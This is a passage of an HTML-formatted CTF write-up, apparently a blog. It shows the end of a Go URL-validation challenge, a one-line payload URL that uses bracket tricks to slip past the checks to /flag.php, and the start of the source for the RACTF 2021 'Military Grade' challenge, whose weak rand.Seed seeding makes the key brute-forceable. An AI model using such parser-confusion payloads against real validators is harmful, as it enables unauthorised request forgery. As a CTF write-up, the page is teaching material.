&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Scheme&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Scheme [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Scheme&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Opaque&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: WHAT AER YOU DOING ?!!! (%s)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Opaque&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Hostname&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Hostname [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Hostname&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;80&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Port [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Authorization Required&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Username&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Username [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Username&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">set&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Password&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">set&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;P@ssw0rd!&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Password [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RequestURI&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.php&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid RequestURI [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RequestURI&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fragment&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Fragment [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fragment&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;Pwned!&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: San Check failed&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>http://root:P@ssw0rd!@[127.0.0.1][&amp;#39;Pwned!&amp;#39;]:80/flag.php
&lt;/code>&lt;/pre>&lt;h2 id="randseed-种子小的情况下可爆破">rand.Seed 种子小的情况下可爆破&lt;/h2>
&lt;h3 id="ractf-2021military-grade">[RACTF 2021]Military Grade&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
